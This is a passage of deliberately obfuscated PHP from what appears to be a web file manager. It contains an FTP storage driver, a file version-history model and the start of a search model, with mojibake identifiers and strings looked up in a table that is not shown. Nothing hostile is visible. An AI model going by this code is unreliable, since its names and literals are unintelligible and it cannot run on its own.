FTP_USEPASVADDRESS, !1); $Æ‰¯ÏûË = $this->pasv == $¢ìœŞìû[90] ? !0 : !1; @ftp_pasv($this->connect, $Æ‰¯ÏûË); $¸¸ùóİÓ[$¾õ»—½¡] = array($¢ìœŞìû[1416] => $this->connect, $¢ìœŞìû[198] => $this->host, $¢ìœŞìû[197] => $this->scheme, $¢ìœŞìû[199] => $this->port); return $İ´èûıè; } private function _isconn() { if (is_resource($this->connect)) { return !0; } return $this->_login($this->config); } public function mkfile($Ï²å°¾Ó, $–™€¡Àı = '', $®ŞÕß‘ù = REPEAT_RENAME) { if ($this->setContent($Ï²å°¾Ó, $–™€¡Àı)) { return $this->getPathOuter($Ï²å°¾Ó); } return !1; } public function mkdir($Ç¥ÏŸ×, $äõ¿ÏüÇ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $Ç¥ÏŸ× = $this->iconvSystem($Ç¥ÏŸ×); if ($this->_isFolder($Ç¥ÏŸ×) || @ftp_mkdir($this->connect, $Ç¥ÏŸ×)) { return $this->getPathOuter($Ç¥ÏŸ×); } if (!$this->mkdir($this->pathFather($Ç¥ÏŸ×))) { return !1; } if ($Ç¥ÏŸ× = @ftp_mkdir($this->connect, $Ç¥ÏŸ×)) { return $this->getPathOuter($Ç¥ÏŸ×); } return !1; } public function copyFile($Ÿ±ÚÖœ, $¿Ë’‰›á) { if (!$this->_isconn()) { return !1; } $ß¿ÈàÃò = $this->pathThis($this->iconvSystem($Ÿ±ÚÖœ)); $Ã™äÁš = $this->tempFile($ß¿ÈàÃò); $–şæ©ò¿ = $this->iconvApp($Ã™äÁš); $this->download($Ÿ±ÚÖœ, $–şæ©ò¿); $èÖ· ¢ = $this->upload($¿Ë’‰›á, $–şæ©ò¿); $this->tempFileRemve($Ã™äÁš); return $èÖ· ¢; } public function moveFile($à¢‚øî„, $Ñ¯­ÅĞÑ) { if (!$this->_isconn()) { return !1; } $à¢‚øî„ = $this->iconvSystem($à¢‚øî„); $Ñ¯­ÅĞÑ = $this->iconvSystem($Ñ¯­ÅĞÑ); $íøœû¡ = @ftp_rename($this->connect, $à¢‚øî„, $Ñ¯­ÅĞÑ); return $íøœû¡ ? $this->getPathOuter($Ñ¯­ÅĞÑ) : !1; } public function delFile($ÈÚ…) { if (!$this->_isconn()) { return !1; } $ÈÚ… = $this->iconvSystem($ÈÚ…); return @ftp_delete($this->connect, $ÈÚ…); } public function delFolder($ú³ö’è—) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¿­›†› = $êÁı±Í¬ = array(); $this->fileList($ú³ö’è—, $¿­›†›, $êÁı±Í¬, !0); $this->listItemCache = !0; foreach ($êÁı±Í¬ as $µ¾ÕĞ†) { $‚´óá¶‘ = $this->iconvSystem($µ¾ÕĞ†[$_SERVER[Î‹ÃÂŞ„][32]]); $ù…òˆÛı = @ftp_delete($this->connect, $‚´óá¶‘); if (!$ù…òˆÛı) { return !1; } } foreach ($¿­›†› as $‚´óá¶‘) { $‚´óá¶‘ = $this->iconvSystem($‚´óá¶‘); $ù…òˆÛı = @ftp_rmdir($this->connect, $‚´óá¶‘); if (!$ù…òˆÛı) { return !1; } } $ú³ö’è— = $this->iconvSystem($ú³ö’è—); return @ftp_rmdir($this->connect, $ú³ö’è—); } public function rename($áŒı®‰ù, $ıêÑŸçß) { $‡ÌÎ¢À„ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->_isconn()) { return !1; } $£Ä­İö = $this->fileNameAuto($this->pathFather($áŒı®‰ù), $ıêÑŸçß); $£Ä­İö = $this->iconvSystem($£Ä­İö); $áŒı®‰ù = $this->iconvSystem($áŒı®‰ù); $ã¿ÂşöÓ = $this->pathFather($áŒı®‰ù); $ñ”®¾• = rtrim($ã¿ÂşöÓ, $‡ÌÎ¢À„[8]) . $‡ÌÎ¢À„[8] . $£Ä­İö; $ŸÇ±à¹ = @ftp_rename($this->connect, $áŒı®‰ù, $ñ”®¾•); $ñ”®¾• = $this->iconvApp($ñ”®¾•); return $ŸÇ±à¹ ? $this->getPathOuter($ñ”®¾•) : !1; } private function folderInfo($ŠÇ¸Õ›Ò, $ıùÏ˜ˆğ = false) { $¥ĞÚèœ =& $_SERVER[Î‹ÃÂŞ„]; $µ¸İì€ù = array($¥ĞÚèœ[32] => $this->pathThis($ŠÇ¸Õ›Ò), $¥ĞÚèœ[86] => $this->getPathOuter($¥ĞÚèœ[8] . $ŠÇ¸Õ›Ò), $¥ĞÚèœ[33] => $¥ĞÚèœ[77]); if ($ıùÏ˜ˆğ) { return $µ¸İì€ù; } $µ¸İì€ù[$¥ĞÚèœ[217]] = $µ¸İì€ù[$¥ĞÚèœ[87]] = 0; $µ¸İì€ù[$¥ĞÚèœ[218]] = $µ¸İì€ù[$¥ĞÚèœ[219]] = !0; return $µ¸İì€ù; } private function fileInfo($¯©ÊÚùÅ, $íÒ …ø– = false, $ˆì€ = array()) { $ú×‘³Ñ =& $_SERVER[Î‹ÃÂŞ„]; $×£ªŒÒ¡ = array($ú×‘³Ñ[32] => $this->pathThis($¯©ÊÚùÅ), $ú×‘³Ñ[86] => $this->getPathOuter($ú×‘³Ñ[8] . $¯©ÊÚùÅ), $ú×‘³Ñ[33] => $ú×‘³Ñ[216], $ú×‘³Ñ[78] => isset($ˆì€[$ú×‘³Ñ[78]]) ? $ˆì€[$ú×‘³Ñ[78]] : 0, $ú×‘³Ñ[177] => $this->ext($¯©ÊÚùÅ)); if ($íÒ …ø–) { return $×£ªŒÒ¡; } $×£ªŒÒ¡[$ú×‘³Ñ[217]] = $×£ªŒÒ¡[$ú×‘³Ñ[87]] = 0; $×£ªŒÒ¡[$ú×‘³Ñ[218]] = $×£ªŒÒ¡[$ú×‘³Ñ[219]] = !0; $¾Î¦Èó = $this->iconvSystem($¯©ÊÚùÅ); $×£ªŒÒ¡[$ú×‘³Ñ[87]] = @ftp_mdtm($this->connect, $¾Î¦Èó); if (empty($ˆì€)) { $ˆì€ = $this->objectMeta($¯©ÊÚùÅ); if (!$ˆì€) { return $×£ªŒÒ¡; } } $×£ªŒÒ¡[$ú×‘³Ñ[78]] = $ˆì€[$ú×‘³Ñ[78]]; return $×£ªŒÒ¡; } public function size($ÑîŒÕê¬) { $Êš‘Æ¹Â = $this->objectMeta($ÑîŒÕê¬); return $Êš‘Æ¹Â ? $Êš‘Æ¹Â[$_SERVER[Î‹ÃÂŞ„][78]] : 0; } public function info($•®øâö³) { if ($this->isFile($•®øâö³)) { return $this->fileInfo($•®øâö³, 0); } else { if ($this->isFolder($•®øâö³)) { return $this->folderInfo($•®øâö³); } } return !1; } private function fileList($÷ƒúÌ´, &$‘¦ÌÙè, &$¨ÊöİĞË, $ºİï·»İ = false) { $¥œÜÔÂÖ =& $_SERVER[Î‹ÃÂŞ„]; $÷ƒúÌ´ = $this->iconvSystem($÷ƒúÌ´); if (!$this->isFolder($÷ƒúÌ´)) { return !1; } @ftp_chdir($this->connect, $¥œÜÔÂÖ[8]); $÷ƒúÌ´ = rtrim($÷ƒúÌ´, $¥œÜÔÂÖ[8]) . $¥œÜÔÂÖ[8]; check_abort(); $ªÓ¿É = @ftp_rawlist($this->connect, $÷ƒúÌ´); if (!$ªÓ¿É) { $ªÓ¿É = array(); } $øÆÏ¯‚ı = array($¥œÜÔÂÖ[10] => 1, $¥œÜÔÂÖ[1333] => 1); foreach ($ªÓ¿É as $ÜŞŠÙÄ¡) { $¶¾ïÇ’® = $this->_listItem($ÜŞŠÙÄ¡); if ($¶¾ïÇ’®[0] == $¥œÜÔÂÖ[805]) { continue; } $¼©¾ÕÅ = $¶¾ïÇ’®[8]; if (empty($¼©¾ÕÅ) && $¼©¾ÕÅ !== $¥œÜÔÂÖ[214] || isset($øÆÏ¯‚ı[$¼©¾ÕÅ])) { continue; } $¼©¾ÕÅ = $this->iconvApp($÷ƒúÌ´ . ltrim($¼©¾ÕÅ, $¥œÜÔÂÖ[8])); $·¾”®›© = array($¥œÜÔÂÖ[32] => $¼©¾ÕÅ, $¥œÜÔÂÖ[33] => $¥œÜÔÂÖ[216], $¥œÜÔÂÖ[78] => $¶¾ïÇ’®[4]); if (substr($ÜŞŠÙÄ¡, 0, 1) == $¥œÜÔÂÖ[1417]) { $·¾”®›©[$¥œÜÔÂÖ[33]] = $¥œÜÔÂÖ[77]; $·¾”®›©[$¥œÜÔÂÖ[78]] = 0; } $¯š“Ø˜™ = $·¾”®›©[$¥œÜÔÂÖ[33]] == $¥œÜÔÂÖ[77] ? !0 : !1; $this->cacheMethodInfoSet($¼©¾ÕÅ, $¯š“Ø˜™, $·¾”®›©); if ($¯š“Ø˜™) { $‘¦ÌÙè[] = $¼©¾ÕÅ; if ($ºİï·»İ) { $this->fileList($¼©¾ÕÅ, $‘¦ÌÙè, $¨ÊöİĞË, $ºİï·»İ); } continue; } $¨ÊöİĞË[] = $·¾”®›©; } $this->cacheMethodInfoSet($÷ƒúÌ´, !0); } private function _listItem($¶¦½³Â) { if (empty($¶¦½³Â)) { return array(); } $´ùôô¨Ş = preg_split($_SERVER[Î‹ÃÂŞ„][1418], $¶¦½³Â); if (count($´ùôô¨Ş) <= 9) { return $´ùôô¨Ş; } $´ùôô¨Ş[8] = trim(substr($¶¦½³Â, strpos($¶¦½³Â, $´ùôô¨Ş[7]) + strlen($´ùôô¨Ş[7]))); return array_splice($´ùôô¨Ş, 0, 9); } public function listPath($†íèöíô, $»“æÎ³Ğ = false) { $ĞŞè¨Æ… =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->_isconn()) { return !1; } $°„ºÅéœ = $¨àùÁô¯ = array(); $this->fileList($†íèöíô, $°„ºÅéœ, $¨àùÁô¯); foreach ($°„ºÅéœ as $—ªÃ¡Ù => $¢•–”æŠ) { $°„ºÅéœ[$—ªÃ¡Ù] = $this->folderInfo($¢•–”æŠ, $»“æÎ³Ğ); } foreach ($¨àùÁô¯ as $—ªÃ¡Ù => $¢•–”æŠ) { $¨àùÁô¯[$—ªÃ¡Ù] = $this->fileInfo($¢•–”æŠ[$ĞŞè¨Æ…[32]], $»“æÎ³Ğ, $¢•–”æŠ); } return array($ĞŞè¨Æ…[84] => $°„ºÅéœ, $ĞŞè¨Æ…[85] => $¨àùÁô¯); } public function has($±´Ì‚öñ, $ÙÃ—ˆÔÖ = false, $İÇ°ª¸… = true) { $°¦Àıæá =& $_SERVER[Î‹ÃÂŞ„]; $Šá¨ˆ÷ö = $»®Ñ°‘ = array(); $€Ÿ¿€· = $ÙÃ—ˆÔÖ ? !0 : !1; $this->fileList($±´Ì‚öñ, $Šá¨ˆ÷ö, $»®Ñ°‘, $€Ÿ¿€·); if ($ÙÃ—ˆÔÖ) { return array($°¦Àıæá[225] => count($»®Ñ°‘), $°¦Àıæá[226] => count($Šá¨ˆ÷ö)); } if ($İÇ°ª¸…) { if (count($»®Ñ°‘)) { return !0; } } else { if (count($Šá¨ˆ÷ö)) { return !0; } } return !1; } public function listAll($¶óø„å) { $­·’ïîÈ =& $_SERVER[Î‹ÃÂŞ„]; if (!$this->_isconn()) { return !1; } $´¸º´¸Ç = $¹û¼ì‡± = array(); $this->fileList($¶óø„å, $´¸º´¸Ç, $¹û¼ì‡±, !0); $¹Õçş¸„ = array_to_keyvalue($¹û¼ì‡±, $­·’ïîÈ[32]); foreach ($´¸º´¸Ç as $­¸ßï•‰) { if (is_string($­¸ßï•‰)) { $¹Õçş¸„[$­¸ßï•‰] = array($­·’ïîÈ[78] => 0); } } return $this->listAllFiles($¶óø„å, $¹Õçş¸„); } public function getContent($®ÓåğÄ•) { if (!$this->_isconn()) { return !1; } $®ÓåğÄ• = $this->iconvSystem($®ÓåğÄ•); return $this->fileSubstr($®ÓåğÄ•); } public function setContent($ÙÊ½±˜Õ, $°Õ€³€ = '') { if (!$this->_isconn()) { return !1; } $öä¨ÎÌ§ = $this->pathThis($this->iconvSystem($ÙÊ½±˜Õ)); $Ü‚¸–ÙÕ = $this->tempFile($öä¨ÎÌ§); file_put_contents($Ü‚¸–ÙÕ, $°Õ€³€); $ãÁ¨ãÑÚ = $this->upload($ÙÊ½±˜Õ, $this->iconvApp($Ü‚¸–ÙÕ)); $this->tempFileRemve($Ü‚¸–ÙÕ); return $ãÁ¨ãÑÚ; } public function fileSubstr($…»ğ‹ş¥, $Ú›Õ¼øú = 0, $¾Ÿ´½¿Ø = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($…»ğ‹ş¥, $Ú›Õ¼øú, $¾Ÿ´½¿Ø); } private function ftpRequest($ê‹ŒÎ¼â, $‘íıı = 0, $ºÌÂù¨¿ = false) { $ê‹ŒÎ¼â = $this->iconvSystem($ê‹ŒÎ¼â); $ö’­ÇÜ = $this->scheme . $this->host . $_SERVER[Î‹ÃÂŞ„][4] . $this->port; $µí¢ı¿ˆ = curl_init(); curl_setopt($µí¢ı¿ˆ, CURLOPT_URL, $ö’­ÇÜ . $this->pathEncode($ê‹ŒÎ¼â)); curl_setopt($µí¢ı¿ˆ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($ºÌÂù¨¿) { $×ßÁú = $‘íıı + $ºÌÂù¨¿ - 1; curl_setopt($µí¢ı¿ˆ, CURLOPT_RANGE, "{$‘íıı}\55{$×ßÁú}"); } curl_setopt($µí¢ı¿ˆ, CURLOPT_RETURNTRANSFER, 1); $Ó­ú¦şÄ = curl_exec($µí¢ı¿ˆ); curl_close($µí¢ı¿ˆ); return $Ó­ú¦şÄ; } public function upload($è÷Ğ†ê™, $õøÔÃĞ, $µƒ° ö = false, $ÆçÚš = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($è÷Ğ†ê™))) { return !1; } $è÷Ğ†ê™ = $this->iconvSystem($è÷Ğ†ê™); $õøÔÃĞ = $this->iconvSystem($õøÔÃĞ); $¦’àÕË† = ftp_nb_put($this->connect, $è÷Ğ†ê™, $õøÔÃĞ, FTP_BINARY); while ($¦’àÕË† == FTP_MOREDATA) { $¦’àÕË† = ftp_nb_continue($this->connect); } if ($¦’àÕË† != FTP_FINISHED) { return !1; } return $this->getPathOuter($è÷Ğ†ê™); } public function download($Òª™åÆ•, $¶ó£Šò½ = '') { if (!$this->_isconn()) { return !1; } $øØ¸à”ö = $this->pathFather($¶ó£Šò½); if (!IO::mkdir($øØ¸à”ö)) { return !1; } $Òª™åÆ• = $this->iconvSystem($Òª™åÆ•); $¶ó£Šò½ = $this->iconvSystem($¶ó£Šò½); $ÖµâÊ–Å = ftp_nb_get($this->connect, $¶ó£Šò½, $Òª™åÆ•, FTP_BINARY); while ($ÖµâÊ–Å == FTP_MOREDATA) { $ÖµâÊ–Å = ftp_nb_continue($this->connect); } if ($ÖµâÊ–Å != FTP_FINISHED) { return !1; } return $this->iconvApp($¶ó£Šò½); } public function exist($Ü¡Òíå¸) { return $this->isFile($Ü¡Òíå¸) || $this->isFolder($Ü¡Òíå¸); } public function isFile($Øşı ¯–) { return !$this->isFolder($Øşı ¯–) && $this->objectMeta($Øşı ¯–); } public function isFolder($ö„¡şïü) { return $this->cacheMethod($_SERVER[Î‹ÃÂŞ„][168], $ö„¡şïü); } protected function objectMeta($¹–“üÆ²) { return $this->cacheMethod($_SERVER[Î‹ÃÂŞ„][170], $¹–“üÆ²); } protected function _objectMeta($‡¼ßæúæ) { $‘’üÀ¸¬ =& $_SERVER[Î‹ÃÂŞ„]; if ($‡¼ßæúæ == $‘’üÀ¸¬[12] || $‡¼ßæúæ == $‘’üÀ¸¬[8]) { return array(); } if (!$this->_isconn()) { return !1; } $‡¼ßæúæ = $this->iconvSystem($‡¼ßæúæ); $Üß”ñ±¿ = array($‘’üÀ¸¬[32] => $this->iconvApp($‡¼ßæúæ), $‘’üÀ¸¬[33] => $‘’üÀ¸¬[216], $‘’üÀ¸¬[78] => 0); @ftp_chdir($this->connect, $‘’üÀ¸¬[8]); $­öÀÚİ = @ftp_size($this->connect, $‡¼ßæúæ); if ($­öÀÚİ != -1) { $Üß”ñ±¿[$‘’üÀ¸¬[78]] = $­öÀÚİ; } else { $·ø›­õ˜ = @ftp_chdir($this->connect, $‡¼ßæúæ); if (!$·ø›­õ˜) { return !1; } $Üß”ñ±¿[$‘’üÀ¸¬[33]] = $‘’üÀ¸¬[77]; } return $Üß”ñ±¿; } protected function _isFolder($ØÛÙä•­) { $Ü–—‘ú„ =& $_SERVER[Î‹ÃÂŞ„]; if ($ØÛÙä•­ == $Ü–—‘ú„[12] || $ØÛÙä•­ == $Ü–—‘ú„[8]) { return !0; } $ê”â¡ÂÁ = $this->_objectMeta($ØÛÙä•­); return isset($ê”â¡ÂÁ[$Ü–—‘ú„[33]]) && $ê”â¡ÂÁ[$Ü–—‘ú„[33]] == $Ü–—‘ú„[77] ? !0 : !1; } } goto cĞ‹ÈÓÜ; c¢˜İÉÌÊĞ: define($_SERVER[Î‹ÃÂŞ„][284], 1); define($_SERVER[Î‹ÃÂŞ„][285], 2); define($_SERVER[Î‹ÃÂŞ„][286], 3); goto d†±¥à×¢“; dÁ‰ŠÇµõİ: class SourceHistoryModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\165\162\143\145\x5f\150\151\163\x74\157\x72\x79"; public function historyCount($¾Êñ­úª) { $ñ±ÙÍğ” =& $_SERVER[Î‹ÃÂŞ„]; if (!$¾Êñ­úª) { return array(); } if (is_string($¾Êñ­úª) || is_int($¾Êñ­úª)) { $¾Êñ­úª = array($¾Êñ­úª); } $¥£ÓàäÚ = array($ñ±ÙÍğ”[183], $ñ±ÙÍğ”[1935] => $ñ±ÙÍğ”[536]); $ğ“ú¨ÔÙ = array($ñ±ÙÍğ”[183] => array($ñ±ÙÍğ”[7], $¾Êñ­úª)); $…£ûÑ” = $this->field($¥£ÓàäÚ)->where($ğ“ú¨ÔÙ)->group($ñ±ÙÍğ”[183])->select(); return array_to_keyvalue($…£ûÑ”, $ñ±ÙÍğ”[183], $ñ±ÙÍğ”[536]); } public function addHistory($¸ÚÕ¯¥£, $˜ÁÑ‡·– = '') { $ÆËŸ–° =& $_SERVER[Î‹ÃÂŞ„]; $ÃÈ‘şŠñ = array($ÆËŸ–°[461] => $¸ÚÕ¯¥£[$ÆËŸ–°[183]], $ÆËŸ–°[1695] => isset($¸ÚÕ¯¥£[$ÆËŸ–°[499]]) ? $¸ÚÕ¯¥£[$ÆËŸ–°[499]] : $¸ÚÕ¯¥£[$ÆËŸ–°[497]], $ÆËŸ–°[512] => $¸ÚÕ¯¥£[$ÆËŸ–°[511]], $ÆËŸ–°[588] => $¸ÚÕ¯¥£[$ÆËŸ–°[78]], $ÆËŸ–°[2147] => $˜ÁÑ‡·–); if ($GLOBALS[$ÆËŸ–°[6]][$ÆËŸ–°[91]][$ÆËŸ–°[1272]] >= 1) { $this->historyAutoClear($ÃÈ‘şŠñ[$ÆËŸ–°[183]]); $this->add($ÃÈ‘şŠñ); } Hook::trigger($ÆËŸ–°[2148], $ÃÈ‘şŠñ); Model($ÆËŸ–°[2149])->eventFileEdit($¸ÚÕ¯¥£[$ÆËŸ–°[183]]); } private function historyAutoClear($ä¤í¶™) { $ìÉ˜ØéÙ =& $_SERVER[Î‹ÃÂŞ„]; $¦µŞ…¬º = Model($ìÉ˜ØéÙ[817])->get($ìÉ˜ØéÙ[1294]); $Óú ú«Å = intval($GLOBALS[$ìÉ˜ØéÙ[6]][$ìÉ˜ØéÙ[91]][$ìÉ˜ØéÙ[1272]]); $ê¥—ó” = $¦µŞ…¬º == $ìÉ˜ØéÙ[1295] ? min(5, $Óú ú«Å) : $Óú ú«Å; $ê¥—ó” = $ê¥—ó” <= 0 ? 0 : $ê¥—ó” - 1; if ($ê¥—ó” >= 500) { return; } $ñÁî¯¯Û = array($ìÉ˜ØéÙ[461] => $ä¤í¶™); $Ê¼ÙË¿ù = $this->field($ìÉ˜ØéÙ[2150])->where($ñÁî¯¯Û)->order($ìÉ˜ØéÙ[2144])->select(); if (!$Ê¼ÙË¿ù || $ê¥—ó” >= count($Ê¼ÙË¿ù)) { return; } $Å’±ÏÖ = array_to_keyvalue($Ê¼ÙË¿ù, $ìÉ˜ØéÙ[12], $ìÉ˜ØéÙ[445]); $Å’±ÏÖ = array_slice($Å’±ÏÖ, $ê¥—ó”); $¢ú³Õ = array_to_keyvalue($Ê¼ÙË¿ù, $ìÉ˜ØéÙ[12], $ìÉ˜ØéÙ[511]); $¢ú³Õ = array_slice($¢ú³Õ, $ê¥—ó”); if (!$Å’±ÏÖ || !$¢ú³Õ) { return; } $ñÁî¯¯Û = array($ìÉ˜ØéÙ[463] => array($ìÉ˜ØéÙ[7], $Å’±ÏÖ)); $this->where($ñÁî¯¯Û)->delete(); Model($ìÉ˜ØéÙ[514])->remove($¢ú³Õ); } public function listData($…ìÔóÅ‡) { $şŞ§î¦ =& $_SERVER[Î‹ÃÂŞ„]; $Ïœ©üé = array($şŞ§î¦[461] => $…ìÔóÅ‡); $Áìû± = $şŞ§î¦[2151]; $µ°æë¬İ = $this->field($Áìû±)->where($Ïœ©üé)->order($şŞ§î¦[2144])->selectPage(); $this->_listAppendUser($µ°æë¬İ[$şŞ§î¦[415]]); $×Ããñ = Model($şŞ§î¦[817])->get($şŞ§î¦[1294]); $ô ÖéŠ¯ = 5; if ($×Ããñ == $şŞ§î¦[1295]) { $µ°æë¬İ[$şŞ§î¦[415]] = array_slice($µ°æë¬İ[$şŞ§î¦[415]], 0, $ô ÖéŠ¯); $µ°æë¬İ[$şŞ§î¦[412]] = array($şŞ§î¦[2152] => 1, $şŞ§î¦[2153] => 20, $şŞ§î¦[2154] => 1, $şŞ§î¦[2155] => count($µ°æë¬İ[$şŞ§î¦[415]])); } return $µ°æë¬İ; } protected function _listAppendUser(&$ü·£ ¡‡) { $ ÛğÖô­ =& $_SERVER[Î‹ÃÂŞ„]; $ôÎ¦€‚Á = array_to_keyvalue($ü·£ ¡‡, $ ÛğÖô­[12], $ ÛğÖô­[1704]); $Ïğ¶Å‰ = Model($ ÛğÖô­[570])->userListInfo($ôÎ¦€‚Á); foreach ($ü·£ ¡‡ as &$Ë‚¶Ú±õ) { $ºïİùÛÇ = $Ë‚¶Ú±õ[$ ÛğÖô­[1704]]; $Ë‚¶Ú±õ[$ ÛğÖô­[497]] = $Ïğ¶Å‰[$ºïİùÛÇ] ? $Ïğ¶Å‰[$ºïİùÛÇ] : !1; } unset($Ë‚¶Ú±õ); } public function fileInfo($ö®æÉ„) { $À»ü‚Î =& $_SERVER[Î‹ÃÂŞ„]; $¨Ã¥Ş¹÷ = $this->tablePrefix; $–ØóÂ–• = "{$¨Ã¥Ş¹÷}\x69\x6f\137\146\x69\x6c\x65\40\x66\151\154\x65\163\40\157\156\40\x66\151\x6c\x65\x73\x2e\146\151\154\x65\111\x44\40\x3d\40\x68\x69\163\164\157\162\171\56\146\151\154\145\x49\x44"; return $this->alias($À»ü‚Î[2156])->where(array($À»ü‚Î[463] => $ö®æÉ„))->join($–ØóÂ–•, $À»ü‚Î[2157])->find(); } public function removeItem($›·ÚÂ±Ò) { $¡½êˆöı =& $_SERVER[Î‹ÃÂŞ„]; $Òñ³£âÏ = array($¡½êˆöı[463] => $›·ÚÂ±Ò); $ÖªÕ×õÚ = $this->where($Òñ³£âÏ)->find(); if ($ÖªÕ×õÚ) { $óß·¶ôê = $this->where($Òñ³£âÏ)->delete(); Model($¡½êˆöı[514])->remove($ÖªÕ×õÚ[$¡½êˆöı[511]]); return $óß·¶ôê; } return !1; } public function removeBySource($ìÅ¼‚û«) { $ÆÉ—ìñ— =& $_SERVER[Î‹ÃÂŞ„]; if (!$ìÅ¼‚û«) { return !1; } if (!is_array($ìÅ¼‚û«)) { $ìÅ¼‚û« = array($ìÅ¼‚û«); } $’„ñÒ¶ğ = array($ÆÉ—ìñ—[461] => array($ÆÉ—ìñ—[7], $ìÅ¼‚û«)); $ò˜¯¥µÑ = $this->field($ÆÉ—ìñ—[512])->where($’„ñÒ¶ğ)->select(); if ($ò˜¯¥µÑ) { $this->where($’„ñÒ¶ğ)->delete(); $Ê‹´“Şè = array_to_keyvalue($ò˜¯¥µÑ, $ÆÉ—ìñ—[12], $ÆÉ—ìñ—[511]); Model($ÆÉ—ìñ—[514])->remove($Ê‹´“Şè); } return !0; } public function setDetail($²´ò—À, $Çç•²±Õ) { $³±˜¶å· =& $_SERVER[Î‹ÃÂŞ„]; return $this->where(array($³±˜¶å·[463] => $²´ò—À))->save(array($³±˜¶å·[2147] => $Çç•²±Õ)); } public function rollbackToItem($Ó¡¦ØøÎ, $ªáòºÀª) { $¦ÜõŒß =& $_SERVER[Î‹ÃÂŞ„]; $×–Í®ß¥ = Model($¦ÜõŒß[872])->sourceInfo($Ó¡¦ØøÎ); $this->addHistory($×–Í®ß¥, LNG($¦ÜõŒß[2158])); $’ã‚Â© = $this->find($ªáòºÀª); $ıÇ¤ó† = array($¦ÜõŒß[511] => $’ã‚Â©[$¦ÜõŒß[511]], $¦ÜõŒß[78] => $’ã‚Â©[$¦ÜõŒß[78]], $¦ÜõŒß[87] => time(), $¦ÜõŒß[499] => USER_ID); Model($¦ÜõŒß[872])->where(array($¦ÜõŒß[183] => $Ó¡¦ØøÎ))->save($ıÇ¤ó†); return $this->where(array($¦ÜõŒß[463] => $ªáòºÀª))->delete(); } public function clearSame($°İæ¢àÃ) { $¬£„Ñş— =& $_SERVER[Î‹ÃÂŞ„]; $´á¡ª‡Â = $this->listData($°İæ¢àÃ); $ÅÌ¡ÂŒÛ = array_to_keyvalue_group($´á¡ª‡Â, $¬£„Ñş—[511]); $÷Ö»ºÔ— = array(); $åœ”¿€² = array(); foreach ($ÅÌ¡ÂŒÛ as $¦²œß¸í) { if (!$¦²œß¸í || count($¦²œß¸í) <= 1) { continue; } foreach ($¦²œß¸í as $üŒãÁ­) { $÷Ö»ºÔ—[] = $üŒãÁ­[$¬£„Ñş—[511]]; $åœ”¿€²[] = $üŒãÁ­[$¬£„Ñş—[445]]; } } if (!$åœ”¿€²) { return; } $this->where(array($¬£„Ñş—[445] => array($¬£„Ñş—[7], $åœ”¿€²)))->delete(); Model($¬£„Ñş—[514])->remove($÷Ö»ºÔ—); } public function userSpace() { $»ß÷• =& $_SERVER[Î‹ÃÂŞ„]; $óŠ£ Ç« = $this->tablePrefix; $˜İÈéİ = array($»ß÷•[1695] => USER_ID); $»öòí¾¶ = "{$óŠ£ Ç«}\x69\x6f\x5f\x66\151\x6c\145\40\146\x69\154\145\x73\x20\x6f\x6e\x20\146\151\154\x65\163\56\146\x69\154\x65\111\x44\40\x3d\40\x68\151\163\x74\157\162\171\56\x66\x69\154\145\x49\x44"; return $this->alias($»ß÷•[2156])->where($˜İÈéİ)->join($»öòí¾¶, $»ß÷•[2157])->sum($»ß÷•[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($Ä‘÷°¤·) { $š¨ã é =& $_SERVER[Î‹ÃÂŞ„]; $·‚–…Êœ = KodIO::fileTypeList(); $Ù†©å¡— = $·‚–…Êœ[$Ä‘÷°¤·]; if (!$Ù†©å¡—) { return array(); } $¶§¦¨° = $Ù†©å¡—[$š¨ã é[177]]; $¹îª³Ü¶ = $š¨ã é[7]; if (!$Ù†©å¡—[$š¨ã é[177]]) { $ä–àÚÂØ = array_to_keyvalue($·‚–…Êœ, $š¨ã é[12], $š¨ã é[177]); $¶§¦¨° = implode($š¨ã é[50], $ä–àÚÂØ); $¹îª³Ü¶ = $š¨ã é[2159]; } $–ïŠå‚Ã = explode($š¨ã é[50], trim($¶§¦¨°, $š¨ã é[50])); return array($¹îª³Ü¶, $–ïŠå‚Ã); } public function listPathType($Ÿ—–¹åú) { $§»˜óò =& $_SERVER[Î‹ÃÂŞ„]; $­°’ı—’ = $this->fileTypeWhere($Ÿ—–¹åú); if (!$­°’ı—’) { return array(); } $òôœÅã° = USER_ID; $Â°×… = Model($§»˜óò[570])->getInfo($òôœÅã°); $¦›ù—¯ = array($§»˜óò[619] => SourceModel::TYPE_USER, $§»˜óò[556] => array($§»˜óò[583], $§»˜óò[566] . $Â°×…[$§»˜óò[89]][$§»˜óò[183]] . $§»˜óò[584]), $§»˜óò[620] => $òôœÅã°, $§»˜óò[617] => 0, $§»˜óò[618] => $­°’ı—’); return $this->listSource($¦›ù—¯); } public function listSearch($èÂæƒÑ¡, $¥Ü™şâş = 300) { $”Øò¹†Á =& $_SERVER[Î‹ÃÂŞ„]; if (isset($èÂæƒÑ¡[$”Øò¹†Á[1996]]) && $èÂæƒÑ¡[$”Øò¹†Á[1996]]) { $èÂæƒÑ¡[$”Øò¹†Á[1996]] = str_replace($”Øò¹†Á[430], $”Øò¹†Á[2160], trim($èÂæƒÑ¡[$”Øò¹†Á[1996]])); } $£òÉ™Ôã = $this->_parseSearchWhere($èÂæƒÑ¡); if (!isset($£òÉ™Ôã[$”Øò¹†Á[475]])) { $£òÉ™Ôã[$”Øò¹†Á[475]] = 0; } $Åí¯şÒ = $”Øò¹†Á[2161]; $­¦Ü“ï“ = $£òÉ™Ôã; $–¸øÓò„ = $Åí¯şÒ; $this->_listSearchBindPinyin($èÂæƒÑ¡, $£òÉ™Ôã, $Åí¯şÒ); $this->alias($”Øò¹†Á[489])->_makeOrder(); $£òÉ™Ôã = $this->parseWhereLike($£òÉ™Ôã); $ÓÎ†ö¦ß = $this->distinct(!0)->field($Åí¯şÒ)->where($£òÉ™Ôã)->selectPage($¥Ü™şâş); if ($GLOBALS[$”Øò¹†Á[6]][$”Øò¹†Á[427]][$”Øò¹†Á[428]] && Input::check($èÂæƒÑ¡[$”Øò¹†Á[1996]], $”Øò¹†Á[626]) && $ÓÎ†ö¦ß[$”Øò¹†Á[412]][$”Øò¹†Á[399]] == 1 && 